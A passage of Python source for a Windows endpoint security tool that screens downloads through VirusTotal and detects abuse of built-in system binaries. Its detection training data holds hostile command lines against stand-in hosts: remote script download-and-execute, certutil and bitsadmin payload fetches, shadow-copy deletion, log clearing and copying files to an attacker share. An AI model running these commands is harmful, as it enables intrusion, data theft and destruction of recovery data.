        headers = {"x-apikey": self.virustotal_api_key}
        try:
            async with aiohttp.ClientSession() as session:
                # Check domain reputation
                async with session.get(f"{self.virustotal_base_url}domains/{domain}", headers=headers) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
                        total_engines = sum(stats.values()) or 1
                        malicious_ratio = (stats.get('malicious', 0) + stats.get('suspicious', 0)) / total_engines
                        
                        if malicious_ratio >= self.min_virustotal_ratio:
                            self.virustotal_cache[domain] = {'safe': False, 'timestamp': time.time()}
                            self.logger.warning(f"Domain {domain} flagged as malicious ({malicious_ratio:.2%} detection rate)")
                            # Don't block IP immediately, just cache the result
                            return False

                # Check specific URL (only for high-risk scenarios)
                if any(keyword in url.lower() for keyword in ['download', 'file', 'exe', 'dll', 'msi']):
                    async with session.post(f"{self.virustotal_base_url}urls", headers=headers, data={"url": url}) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            analysis_id = data.get('data', {}).get('id')
                            analysis_url = f"{self.virustotal_base_url}analyses/{analysis_id}"
                            
                            # Wait 1 second for quick scan (VirusTotal's cached results)
                            await asyncio.sleep(1)
                            
                            async with session.get(analysis_url, headers=headers) as analysis_resp:
                                if analysis_resp.status == 200:
                                    analysis_data = await analysis_resp.json()
                                    stats = analysis_data.get('data', {}).get('attributes', {}).get('stats', {})
                                    total_engines = sum(stats.values()) or 1
                                    malicious_ratio = (stats.get('malicious', 0) + stats.get('suspicious', 0)) / total_engines
                                    
                                    if malicious_ratio >= self.min_virustotal_ratio:
                                        self.virustotal_cache[domain] = {'safe': False, 'timestamp': time.time()}
                                        self.logger.warning(f"URL {url} flagged as malicious ({malicious_ratio:.2%} detection rate)")
                                        return False
            return True
        except Exception as e:
            self.logger.error(f"VirusTotal real-time check failed for {url}: {e}")
            return True  # Allow if check fails (don't block on error)
# Check specific URL
    async def _monitor_network_connections(self):
        """PRE-DOWNLOAD PROTECTION - Check URLs before download starts"""
        while self.monitoring_active:
            try:
                # Get all active connections
                all_conns = await asyncio.get_running_loop().run_in_executor(
                    None,
                    psutil.net_connections
                )
                
                # Create PID-to-connections mapping
                conns_by_pid = defaultdict(list)
                for conn in all_conns:
                    if conn.pid:
                        conns_by_pid[conn.pid].append(conn)
                
                # Monitor browsers and download tools
                monitored_processes = {
                    # Browsers
                    'chrome.exe', 'firefox.exe', 'msedge.exe', 'iexplore.exe', 
                    'opera.exe', 'brave.exe', 'safari.exe',
                    # Download tools
                    'curl.exe', 'wget.exe', 'powershell.exe', 'bitsadmin.exe', 
                    'certutil.exe', 'certreq.exe'
                }
                
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        
                        if proc_name not in monitored_processes:
                            continue

                        pid = proc.info['pid']
                        
                        # Check connections for this process
                        for conn in conns_by_pid.get(pid, []):
                            if conn.status == 'ESTABLISHED' and conn.raddr:
                                ip, port = conn.raddr
                                
                                # Only check HTTP/HTTPS connections
                                if port in (80, 443, 8080, 8443):
                                    await self._pre_download_check(proc, conn, ip, port)
                                    
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                        
                await asyncio.sleep(0.1)  # Check every 100ms for ultra-fast response
            except Exception as e:
                self.logger.error(f"Pre-download monitor error: {e}")
                await asyncio.sleep(5)
    
    async def _pre_download_check(self, proc, conn, ip, port):
        """PRE-DOWNLOAD CHECK: Verify URL is safe before allowing download to start"""
        try:
            # Get the download URL
            download_url = await self._get_download_url(proc, ip, port)
            if not download_url:
                return
            
            # Check if this looks like a file download
            if not self._is_likely_file_download(download_url):
                return
                
            self.logger.info(f"SCAN PRE-DOWNLOAD CHECK: {download_url} via {proc.name()}")
            
            # Check with VirusTotal BEFORE download starts
            is_malicious = await self._check_url_with_virustotal(download_url)
            
            if is_malicious:
                self.logger.critical(f"ALERT MALICIOUS DOWNLOAD PREVENTED: {download_url}")
                self.logger.critical(f"   Process: {proc.name()} (PID: {proc.pid})")
                self.logger.critical(f"   IP: {ip}:{port}")
                self.logger.critical(f"   Action: Download BLOCKED before it started")
                
                # Block the download before it starts
                await self._block_malicious_download_before_start(proc, conn, download_url)
            else:
                self.logger.info(f"SUCCESS SAFE DOWNLOAD ALLOWED: {download_url}")
                self.logger.info(f"   Process: {proc.name()} (PID: {proc.pid})")
                self.logger.info(f"   Action: Download can proceed")
                
        except Exception as e:
            self.logger.error(f"Error in pre-download check: {e}")
    
    async def _block_malicious_download_before_start(self, proc, conn, download_url):
        """Block malicious download before it starts downloading"""
        try:
            # Terminate the downloading process immediately
            proc.kill()
            self.logger.info(f"KILLED malicious download process: {proc.name()} (PID: {proc.pid})")
            
            # Block the domain to prevent future attempts
            from urllib.parse import urlparse
            parsed_url = urlparse(download_url)
            if parsed_url.netloc:
                self.blocked_domains.add(parsed_url.netloc)
                self.logger.info(f"BLOCKED malicious domain: {parsed_url.netloc}")
            
            # Block the IP address
            ip, port = conn.raddr
            self.blocked_ips.add(ip)
            self.logger.info(f"BLOCKED malicious IP: {ip}")
            
            # Create firewall rule to block future connections
            await self._block_ip_wfp(ip)
            
            # Log the prevention
            self.logger.critical(f"PROTECTION SUCCESSFUL")
            self.logger.critical(f"   Malicious file was prevented from downloading")
            self.logger.critical(f"   Process terminated before download could start")
            self.logger.critical(f"   Domain and IP blocked for future protection")
            
        except Exception as e:
            self.logger.error(f"Error blocking malicious download before start: {e}")
    
    async def _get_download_url(self, proc, ip, port):
        """Extract the download URL from process or connection"""
        try:
            # Try to get URL from command line first
            cmdline = ' '.join(proc.cmdline()).lower()
            
            # Look for URLs in command line
            import re
            url_patterns = [
                r'https?://[^\s<>"{}|\\^`\[\]]+\.(exe|dll|msi|ps1|bat|js|vbs|zip|rar|7z|iso|msu|cab)',
                r'https?://[^\s<>"{}|\\^`\[\]]+/download/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/downloads/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/file/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/files/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/get/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/fetch/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/dl/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/attachment/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/setup/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/install/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/update/',
                r'https?://[^\s<>"{}|\\^`\[\]]+/patch/',
            ]
            
            for pattern in url_patterns:
                matches = re.findall(pattern, cmdline, re.IGNORECASE)
                if matches:
                    return matches[0]
            
            # Fallback: construct URL from IP and port
            domain = await self._resolve_ip_to_domain_cached(ip)
            if domain:
                protocol = 'https' if port in (443, 8443) else 'http'
                return f"{protocol}://{domain}"
                
        except Exception:
            pass
        
        return None
    
    def _is_likely_file_download(self, url):
        """Check if URL is likely downloading a file"""
        if not url:
            return False
            
        url_lower = url.lower()
        
        # Check for file extensions
        file_extensions = ['.exe', '.dll', '.msi', '.ps1', '.bat', '.js', '.vbs', 
                          '.zip', '.rar', '.7z', '.iso', '.msu', '.cab', '.jar',
                          '.scr', '.pif', '.com', '.hta', '.wsf']
        
        if any(ext in url_lower for ext in file_extensions):
            return True
            
        # Check for download keywords
        download_keywords = ['/download/', '/downloads/', '/file/', '/files/', 
                           '/get/', '/fetch/', '/dl/', '/attachment/',
                           '/setup/', '/install/', '/update/', '/patch/']
        
        if any(keyword in url_lower for keyword in download_keywords):
            return True
            
        return False
    
    async def _check_url_with_virustotal(self, url):
        """Check if URL is malicious using VirusTotal - PRE-DOWNLOAD CHECK with multiprocessing"""
        if not self.virustotal_api_key:
            self.logger.warning("VirusTotal API key not configured - allowing download")
            return False
            
        # Check cache first
        if url in self.scanned_urls:
            cached_result = self.scanned_urls[url]
            if time.time() - cached_result['timestamp'] < 3600:  # 1 hour cache
                return cached_result.get('malicious', False)
        
        try:
            # Use multiprocessing for CPU-intensive VirusTotal API calls
            headers = {"x-apikey": self.virustotal_api_key}
            
            async with aiohttp.ClientSession() as session:
                # Check domain reputation first (faster)
                from urllib.parse import urlparse
                parsed_url = urlparse(url)
                domain = parsed_url.netloc
                
                if domain:
                    domain_url = f"{self.virustotal_base_url}domains/{domain}"
                    async with session.get(domain_url, headers=headers) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
                            malicious = stats.get('malicious', 0)
                            suspicious = stats.get('suspicious', 0)
                            total = sum(stats.values()) or 1
                            ratio = (malicious + suspicious) / total
                            
                            if ratio >= self.min_virustotal_ratio:
                                self.scanned_urls[url] = {
                                    'malicious': True,
                                    'timestamp': time.time(),
                                    'ratio': ratio,
                                    'reason': f'Domain reputation: {ratio:.2%} malicious'
                                }
                                self.logger.warning(f"ALERT Domain flagged as malicious: {domain} ({ratio:.2%} detection rate)")
                                return True
                
                # Check specific URL for more detailed analysis using multiprocessing
                url_check_url = f"{self.virustotal_base_url}urls"
                payload = {"url": url}
                
                async with session.post(url_check_url, headers=headers, data=payload) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        analysis_id = data.get('data', {}).get('id')
                        
                        # Wait for analysis (VirusTotal cached results are usually fast)
                        await asyncio.sleep(1)
                        
                        analysis_url = f"{self.virustotal_base_url}analyses/{analysis_id}"
                        async with session.get(analysis_url, headers=headers) as analysis_resp:
                            if analysis_resp.status == 200:
                                analysis_data = await analysis_resp.json()
                                stats = analysis_data.get('data', {}).get('attributes', {}).get('stats', {})
                                malicious = stats.get('malicious', 0)
                                suspicious = stats.get('suspicious', 0)
                                total = sum(stats.values()) or 1
                                ratio = (malicious + suspicious) / total
                                
                                if ratio >= self.min_virustotal_ratio:
                                    self.scanned_urls[url] = {
                                        'malicious': True,
                                        'timestamp': time.time(),
                                        'ratio': ratio,
                                        'reason': f'URL analysis: {ratio:.2%} malicious'
                                    }
                                    self.logger.warning(f"ALERT URL flagged as malicious: {url} ({ratio:.2%} detection rate)")
                                    return True
                
                # URL is safe
                self.scanned_urls[url] = {
                    'malicious': False,
                    'timestamp': time.time(),
                    'ratio': 0,
                    'reason': 'clean'
                }
                return False
                
        except Exception as e:
            self.logger.error(f"VirusTotal pre-download check failed for {url}: {e}")
            return False  # Allow on error (conservative approach)
    
    async def _block_malicious_download(self, proc, conn, download_url):
        """Block a malicious download"""
        try:
            # Terminate the downloading process
            proc.kill()
            self.logger.info(f"KILLED malicious process: {proc.name()} (PID: {proc.pid})")
            
            # Block the domain
            from urllib.parse import urlparse
            parsed_url = urlparse(download_url)
            if parsed_url.netloc:
                self.blocked_domains.add(parsed_url.netloc)
                self.logger.info(f"BLOCKED malicious domain: {parsed_url.netloc}")
            
            # Block the IP
            ip, port = conn.raddr
            self.blocked_ips.add(ip)
            self.logger.info(f"BLOCKED malicious IP: {ip}")
            
            # Create firewall rule
            await self._block_ip_wfp(ip)
            
        except Exception as e:
            self.logger.error(f"Error blocking malicious download: {e}")

    async def _resolve_ip_to_domain_cached(self, ip):
        """Resolve IP to domain (with caching)"""
        try:
             return socket.gethostbyaddr(ip)[0]
        except socket.herror as e:
            self.logger.warning(f"Reverse DNS lookup failed for {ip}: {e}")
            return None
        except Exception as e:
            self.logger.error(f"Unexpected error resolving {ip}: {e}")
            return None
                
    async def _check_for_download(self, proc):
        """Check if process is downloading a file"""
        try:
            # Check for common download file handles
            for f in proc.open_files():
                if any(f.path.lower().endswith(ext) for ext in self.download_extensions):
                    return True
                    
            # Check command line for download commands
            cmdline = ' '.join(proc.cmdline()).lower()
            download_keywords = [
                'download', 'curl', 'wget', 'bitsadmin', 'certutil',
                'invoke-webrequest', 'save-file', 'savefile'
            ]
            return any(kw in cmdline for kw in download_keywords)
        except Exception:
            return False
            
    async def _monitor_download(self, proc, conn):
        """Monitor a download and check the file with VirusTotal"""
        try:
            # Wait for download to complete (simplified - in reality would need proper tracking)
            await asyncio.sleep(10)
            
            # Find the newest file that matches download extensions
            newest_file = None
            newest_time = 0
            
            for f in proc.open_files():
                if any(f.path.lower().endswith(ext) for ext in self.download_extensions):
                    try:
                        mtime = os.path.getmtime(f.path)
                        if mtime > newest_time:
                            newest_time = mtime
                            newest_file = f.path
                    except Exception:
                        continue
                        
            if newest_file:
                safe = await self._check_download_with_virustotal(newest_file)
                if not safe:
                    self.logger.warning(f"Blocking malicious download: {newest_file}")
                    os.remove(newest_file)  # Delete the malicious file
                    await self._block_process({
                        'pid': proc.pid,
                        'name': proc.name(),
                        'cmdline': ' '.join(proc.cmdline())
                    }, {'reason': 'malicious_download'})
                    
        except Exception as e:
            self.logger.error(f"Download monitoring error: {e}")
            
    async def _resolve_ip_to_domain(self, ip):
        """Resolve IP to domain (simplified)"""
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return None
            
    async def _block_network_connection(self, proc, conn):
        """Block a network connection"""
        try:
            # Windows specific - use Windows Filtering Platform API or similar
            # This is a simplified placeholder
            self.logger.info(f"Would block connection from {proc.name()} to {conn.raddr}")
        except Exception as e:
            self.logger.error(f"Failed to block connection: {e}")
    # Commented out old process analyzer - replaced with new implementation
    # async def process_analyzer(self, queue):
    #     while True:
    #         try:
    #             item = await queue.get()
    #             if item is None: 
    #                 queue.task_done() # Handle shutdown signal
    #                 break
    #             
    #             pid, process_name, command_line, creation_time = item
    #             # Add type checking for OpenConsole.exe
    #             if process_name.lower() == "openconsole.exe":
    #                 self.logger.info(f"Skipping analysis for OpenConsole.exe (PID: {pid})")
    #                 queue.task_done()
    #                 continue
    #                 
    #             self.logger.info(f"Analyzing process: {process_name} (PID: {pid})")
    #             detection_result = self.lolbin_detector.detect(process_name, command_line)
    #             
    #             # Handle different return types
    #             if isinstance(detection_result, dict) and detection_result.get('detected'):
    #                 # Process detection logic
    #                 self.logger.critical(f"LOLBin detected: {process_name} with pattern {detection_result.get('matched_pattern')}")
    #                 try:
    #                     self._terminate_process_tree(pid)
    #                     self._add_to_blocklist(process_name, command_line)
    #                 except Exception as e:
    #                     self.logger.error(f"Error blocking process {pid}: {e}")
    #             elif detection_result is None:
    #                 # Not detected - allow process
    #                 self.logger.info(f"No LOLBin detected for {process_name} (PID: {pid}), unfreezing.")
    #                 await self._unfreeze_process(pid)
    #             else:
    #                 self.logger.warning(f"Unexpected detection result type: {type(detection_result)}")
    #                 await self._unfreeze_process(pid)  # Unfreeze as precaution
    #             
    #             queue.task_done()
    #         except Exception as e:
    #             self.logger.error(f"Consumer error: {e}")
    #             # Add a small delay to prevent tight error loops
    #             await asyncio.sleep(0.1)
    #             queue.task_done()

    async def on_process_event(self, pid, process_name, command_line):
        process_name_lower = process_name.lower()
        
        # Add sppsvc.exe to protected processes
        protected = ["csrss.exe", "wininit.exe", "services.exe", 
                    "lsass.exe", "svchost.exe", "taskhostw.exe",
                    "conhost.exe", "sppsvc.exe", "SearchProtocolHost.exe"]
        
        if process_name_lower in protected:
            self.logger.info(f"Skipping protected process: {process_name} (PID: {pid})")
            return

        try:
            # Freeze process using the existing freeze method
            if not await self._freeze_process(pid):
                self.logger.error(f"Failed to freeze process {pid}")
                await self._block_process({'pid': pid, 'name': process_name, 'cmdline': command_line}, 
                                        {'reason': 'freeze_failure'})
                return

            self.logger.info(f"Froze process {pid}")
        except Exception as e:
            self.logger.error(f"Failed to freeze process {pid}: {e}")
            await self._block_process({'pid': pid, 'name': process_name, 'cmdline': command_line}, 
                                    {'reason': 'freeze_failure'})
            return

        # Send for analysis using the existing consumer
        process_info = {
            'pid': pid,
            'name': process_name,
            'cmdline': command_line,
            'create_time': time.time()
        }
        self.process_interceptor.process_queue.put(process_info)
    async def _run_cpu_bound(self, func, *args):
        """Run CPU-bound tasks in thread pool"""
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(self.cpu_thread_pool, func, *args)

    async def _run_io_bound(self, func, *args):
        """Run I/O-bound tasks in thread pool"""
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(self.io_thread_pool, func, *args)

    async def _run_cpu_intensive(self, func, *args):
        """Run CPU-intensive tasks in process pool (true multiprocessing)"""
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(self.cpu_process_pool, func, *args)

    def _safe_lolbin_detect(self, name, cmdline):
        """Fast LOLBin detection with caching"""
        try:
            # Ensure inputs are strings
            name = str(name) if name else ""
            cmdline = str(cmdline) if cmdline else ""
            
            # Create cache key
            cache_key = f"{name}:{hash(cmdline)}"
            
            # Check cache first
            if hasattr(self, '_lolbin_cache') and cache_key in self._lolbin_cache:
                return self._lolbin_cache[cache_key]
            
            # Call the actual LOLBin detector
            result = self.lolbin_detector.detect(name, cmdline)
            
            # Cache the result
            if not hasattr(self, '_lolbin_cache'):
                self._lolbin_cache = {}
            self._lolbin_cache[cache_key] = result
            
            # Limit cache size
            if len(self._lolbin_cache) > 1000:
                # Remove oldest entries
                keys_to_remove = list(self._lolbin_cache.keys())[:100]
                for key in keys_to_remove:
                    del self._lolbin_cache[key]
            
            return result
        except Exception as e:
            self.logger.error(f"LOLBin detection failed for {name}: {e}")
            return {'detected': False, 'error': str(e)}

    async def _gather_initial_analyses(self, process_info):
        """Run initial analyses in parallel with timeout"""
        name = process_info['name']
        cmdline = process_info.get('cmdline', '')
        pid = process_info['pid']
        
        # Fast path: Quick LOLBin check first
        lolbin_result = self._safe_lolbin_detect(name, cmdline)
        
        # If high-severity LOLBin detected, block immediately
        if lolbin_result.get('detected') and lolbin_result.get('severity') == 'high':
            self.logger.critical(f"CRITICAL LOLBin detected: {name} (PID: {pid}) - Blocking immediately")
            return [lolbin_result, {}, {}, {}]
        
        # Create analysis tasks with timeout
        tasks = [
            asyncio.create_task(self._run_cpu_bound(self._safe_lolbin_detect, name, cmdline)),
            asyncio.create_task(self._run_cpu_bound(
                self.volt_detector.analyze_for_volt_typhoon, 
                process_info, 
                cmdline
            )),
            asyncio.create_task(self._run_io_bound(self.process_analyzer.analyze_process_chain, pid)),
            asyncio.create_task(self._run_cpu_bound(
                self.behavioral_analyzer.analyze_command, 
                cmdline
            ))
        ]
        
        try:
            # Run with 2-second timeout for fast response
            results = await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=2.0
            )
            
            # Process results and handle exceptions
            processed_results = []
            for res in results:
                if isinstance(res, Exception):
                    processed_results.append({})  # Default empty result
                else:
                    processed_results.append(res)
                    
            return processed_results
        except asyncio.TimeoutError:
            self.logger.warning(f"Analysis timeout for {name} (PID: {pid}) - using cached results")
            return [lolbin_result, {}, {}, {}]
        except Exception as e:
            self.logger.error(f"Analysis error for {name}: {e}")
            return [lolbin_result, {}, {}, {}]
    
    async def start_protection(self):
        self.logger.info("Starting Security Gateway...")
        self.start_keyboard_monitor()
        
        # Store the event loop reference for thread-safe async operations
        self.loop = asyncio.get_event_loop()
        
        # Initialize ML model
        await self._initialize_ml_model()
        
        # Prepare VMs for snapshot operations
        self.logger.info("Preparing VirtualBox VMs for snapshot operations...")
        self.vm_manager.prepare_vms_for_snapshots()
        
        # Start adaptive semaphore
        await self.adaptive_semaphore.start_adjusting()  # Start adjustment task
        
        # Start process interception
        self.process_interceptor.start_interception()
        self.monitoring_active = True
        
        # Start enhanced download monitoring
        self.download_monitor.start_monitoring()
        
        # Start network monitoring
        asyncio.create_task(self._monitor_network_connections())
        
        # Start backup LOLBin detection (catches missed processes)
        asyncio.create_task(self._backup_lolbin_detection())
        
        # Create consumers
        cpu_count = os.cpu_count() or 4  # Default to 4 if None
        consumer_tasks = [asyncio.create_task(self._process_consumer()) 
                        for _ in range(cpu_count)]
        self.active_tasks.update(consumer_tasks)
        
        try:
            while self.monitoring_active:
                await asyncio.sleep(1)
        finally:
            self.logger.info("Shutting down Security Gateway...")
            
            # Create final shutdown snapshot
            try:
                await self._create_final_shutdown_snapshot()
            except Exception as e:
                self.logger.error(f"Error creating final snapshot during shutdown: {e}")
            
            # Gracefully stop VMs after snapshot creation
            try:
                await self._gracefully_stop_vms()
            except Exception as e:
                self.logger.error(f"Error stopping VMs during shutdown: {e}")
            
            await self.adaptive_semaphore.stop_adjusting()
            self.process_interceptor.running = False
            self.process_interceptor.real_time_monitor.stop()
            
            # Stop enhanced download monitoring
            self.download_monitor.stop_monitoring()
            
            for task in consumer_tasks:
                task.cancel()
            await asyncio.gather(*consumer_tasks, return_exceptions=True)

            self.cpu_thread_pool.shutdown(wait=True)
            self.io_thread_pool.shutdown(wait=True)
            self.cpu_process_pool.shutdown(wait=True)  # Shutdown multiprocessing pool

            self.logger.info("Security Gateway stopped cleanly")

    async def _process_consumer(self):
        """Fast consumer task for processing intercepted processes"""
        while self.monitoring_active:
            try:
                # Get process from queue with shorter timeout
                process_info = await asyncio.get_event_loop().run_in_executor(
                    self.io_thread_pool,
                    lambda: self.process_interceptor.process_queue.get(timeout=0.005)  # Reduced from 0.01 to 0.005
                )
                
                # ✅ Handle None or unexpected item type
                if not process_info or not isinstance(process_info, dict):
                    continue
                
                # Comprehensive LOLBin detection - check ALL known LOLBins immediately
                process_name = process_info.get('name', '').lower()
                cmdline = process_info.get('cmdline', '').lower()
                
                # Get all known LOLBins for immediate detection
                all_lolbins = self.volt_detector.get_extended_lolbins()
                
                # Check if this is any LOLBin
                if process_name in [lolbin.lower() for lolbin in all_lolbins]:
                    self.logger.info(f"INTERCEPT CRITICAL: LOLBin detected - {process_name} (PID: {process_info.get('pid')}) - Processing immediately")
                    
                    # Special handling for high-risk LOLBins
                    high_risk_lolbins = [
                        'certutil.exe', 'powershell.exe', 'cmd.exe', 'wmic.exe',
                        'regsvr32.exe', 'rundll32.exe', 'mshta.exe', 'bitsadmin.exe',
                        'schtasks.exe', 'netsh.exe', 'sc.exe', 'reg.exe'
                    ]
                    
                    if process_name in high_risk_lolbins:
                        self.logger.critical(f"HIGH-RISK LOLBin: {process_name} (PID: {process_info.get('pid')}) - URGENT PROCESSING")
                    
                    # Process immediately without any delays
                    await self._handle_intercepted_process(process_info)
                else:
                    # Process immediately without semaphore for speed
                    await self._handle_intercepted_process(process_info)
                    
            except queue.Empty:
                await asyncio.sleep(0.0001)  # Ultra-fast polling (0.1ms)
            except Exception as e:
                self.logger.error(f"Consumer error: {e}")
                # Add a small delay to prevent tight error loops
                await asyncio.sleep(0.1)
                       
    async def _initialize_ml_model(self):
        """Initialize ML model - load existing or train new one"""
        if not os.path.exists("ml_model.pkl"):
            self.logger.info("ML model not found. Training a new model...")

            # Get LOLBin patterns from the detector for comprehensive training
            lolbin_patterns = self.lolbin_detector._load_lolbin_patterns()
            whitelist_patterns = self.lolbin_detector._load_whitelist_patterns()
            severity_map = self.lolbin_detector._create_severity_map()

            # Comprehensive training data with both benign and malicious samples
            training_data = [
                # BENIGN PROCESSES (Normal system activity)
                {"name": "explorer.exe", "cmdline": ["explorer.exe"]},
                {"name": "notepad.exe", "cmdline": ["notepad.exe"]},
                {"name": "calc.exe", "cmdline": ["calc.exe"]},
                {"name": "chrome.exe", "cmdline": ["chrome.exe"]},
                {"name": "firefox.exe", "cmdline": ["firefox.exe"]},
                {"name": "msedge.exe", "cmdline": ["msedge.exe"]},
                {"name": "wordpad.exe", "cmdline": ["wordpad.exe"]},
                {"name": "mspaint.exe", "cmdline": ["mspaint.exe"]},
                {"name": "control.exe", "cmdline": ["control.exe"]},
                {"name": "taskmgr.exe", "cmdline": ["taskmgr.exe"]},
                
                # BENIGN LOLBins usage (legitimate system administration)
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "echo", "Hello"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "dir"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "ipconfig"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-Command", "Get-Help"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-Command", "Get-Process"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-Command", "Get-Service"]},
                {"name": "regsvr32.exe", "cmdline": ["regsvr32.exe", "/?"]},
                {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "shell32.dll,Control_RunDLL", "desk.cpl"]},
                {"name": "mshta.exe", "cmdline": ["mshta.exe", "about:blank"]},
                {"name": "bitsadmin.exe", "cmdline": ["bitsadmin.exe", "/list"]},
                {"name": "schtasks.exe", "cmdline": ["schtasks.exe", "/query"]},
                {"name": "whoami.exe", "cmdline": ["whoami.exe"]},
                {"name": "net.exe", "cmdline": ["net.exe", "user"]},
                {"name": "sc.exe", "cmdline": ["sc.exe", "query"]},
                {"name": "tasklist.exe", "cmdline": ["tasklist.exe"]},
                {"name": "certutil.exe", "cmdline": ["certutil.exe", "-?"]},
                {"name": "certutil.exe", "cmdline": ["certutil.exe", "-dump"]},
                {"name": "netsh.exe", "cmdline": ["netsh.exe", "interface", "show"]},
                {"name": "wmic.exe", "cmdline": ["wmic.exe", "process", "list"]},
                {"name": "reg.exe", "cmdline": ["reg.exe", "query"]},
                
                # WHITELISTED LOLBins (legitimate but suspicious-looking)
                {"name": "certutil.exe", "cmdline": ["certutil.exe", "-urlcache", "-split", "http://ctldl.windowsupdate.com"]},
                {"name": "certutil.exe", "cmdline": ["certutil.exe", "-verifyctl", "-f", "http://crl.microsoft.com"]},
                {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "ThemeUI.dll,OpenThemeData"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-ExecutionPolicy", "Restricted", "-Command", "Get-Process"]},
                {"name": "bitsadmin.exe", "cmdline": ["bitsadmin.exe", "/transfer", "WindowsUpdate", "http://windowsupdate.com"]},
                {"name": "wmic.exe", "cmdline": ["wmic.exe", "/node:localhost", "process", "list", "brief"]},
                {"name": "msbuild.exe", "cmdline": ["msbuild.exe", "/nologo", "/verbosity:quiet", "/t:Restore"]},
                {"name": "wsl.exe", "cmdline": ["wsl.exe", "--install"]},
                
                # MALICIOUS LOLBins usage (based on actual LOLBin detector patterns)
                # PowerShell malicious patterns
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-windowstyle", "hidden", "-encodedcommand", "aGVsbG8="]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-executionpolicy", "bypass", "-command", "Invoke-Expression"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-nop", "-ep", "bypass", "-enc", "base64encodedpayload"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-Command", "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-Command", "iex (irm http://malicious.com/payload.ps1)"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-Command", "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'malicious' -Value 'C:\\malicious\\payload.exe'"]},
                
                # CMD malicious patterns
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.1 connectport=80"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "certutil -urlcache -split -f http://malicious.example.com/payload.exe payload.exe"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "bitsadmin /transfer job http://malicious.example.com/file.exe C:\\temp\\file.exe"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "forfiles /m *.docx /c \"cmd /c del\""]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "vssadmin delete shadows /all"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "wevtutil cl system"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "attrib +s +h malicious.exe"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "icacls C:\\malicious /grant Everyone:F"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "arp -a"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "route print"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "net user /domain"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "wmic /node:10.0.0.1 /user:admin /password:pass process call create cmd.exe"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "copy C:\\sensitive\\* \\\\attacker\\share\\"]},
                
                # DLL Execution malicious patterns
                {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "C:\\Windows\\System32\\evil.dll,EntryPoint"]},
                {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "javascript:alert('malicious')"]},
                {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "C:\\malicious\\payload.dll,EntryPoint"]},
                {"name": "regsvr32.exe", "cmdline": ["regsvr32.exe", "/s", "/n", "/u", "/i:http://malicious.example.com/script.sct", "scrobj.dll"]},
                {"name": "regsvr32.exe", "cmdline": ["regsvr32.exe", "/s", "C:\\malicious\\payload.dll"]},
                
                # Script Engines malicious patterns
                {"name": "wscript.exe", "cmdline": ["wscript.exe", "C:\\Scripts\\payload.vbs"]},
                {"name": "cscript.exe", "cmdline": ["cscript.exe", "C:\\Scripts\\payload.js"]},
                {"name": "mshta.exe", "cmdline": ["mshta.exe", "vbscript:CreateObject('WScript.Shell').Run('cmd.exe')"]},
                
                # Certificate utilities malicious patterns
                {"name": "certutil.exe", "cmdline": ["certutil.exe", "-urlcache", "-split", "-f", "http://malicious.example.com/payload.exe", "payload.exe"]},
                {"name": "certutil.exe", "cmdline": ["certutil.exe", "-decode", "malicious.b64", "payload.exe"]},
                
                # Network utilities malicious patterns
